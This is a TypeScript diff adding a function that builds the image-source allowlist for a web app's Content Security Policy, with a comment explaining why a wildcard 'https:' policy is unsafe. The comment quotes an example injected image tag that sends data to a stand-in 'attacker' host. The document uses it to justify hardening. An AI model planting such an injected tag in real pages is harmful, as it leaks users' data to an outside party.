@@ -60,6 +60,45 @@ export function createNonce(): string {
   return btoa(String.fromCharCode(...bytes));
 }
 
+/**
+ * The origins images may be loaded from, as `img-src` sources.
+ *
+ * ## Why this is computed rather than written down
+ *
+ * `img-src 'self' data: blob:` reads as complete and is not: listing photography is served from
+ * the object store or its CDN, which is a DIFFERENT origin from the app. The partner portal
+ * declared exactly that policy and consequently could not display a single photograph — the
+ * upload succeeded, the bytes were stored, the URL was correct, and the browser refused to fetch
+ * it. Nothing appears in a server log when a browser enforces a CSP, and no test in the suite
+ * looked at an image, so it went unnoticed until one did.
+ *
+ * ## Why not `https:`
+ *
+ * That is what the customer app used, and it works — by permitting every HTTPS host on the
+ * internet. `img-src` is a real exfiltration channel: an injected `<img src="https://attacker/?d=…">`
+ * sends whatever the injection can read, and a policy of `https:` allows it. Naming the origins we
+ * actually use costs one line of configuration and closes that.
+ *
+ * A base that does not parse is skipped rather than thrown on: it means a relative path, which is
+ * same-origin and already covered by `'self'`. A middleware that threw would take the whole app
+ * down over a configuration typo.
+ */
+export function mediaOrigins(bases: readonly (string | undefined)[]): readonly string[] {
+  const origins = new Set<string>();
+
+  for (const base of bases) {
+    if (!base) continue;
+
+    try {
+      origins.add(new URL(base).origin);
+    } catch {
+      /* Relative, so same-origin. */
+    }
+  }
+
+  return [...origins];
+}
+
 /** Builds the policy string. */
 export function buildCsp(options: CspOptions): string {
   const { nonce, imgSrc, upgradeInsecure } = options;
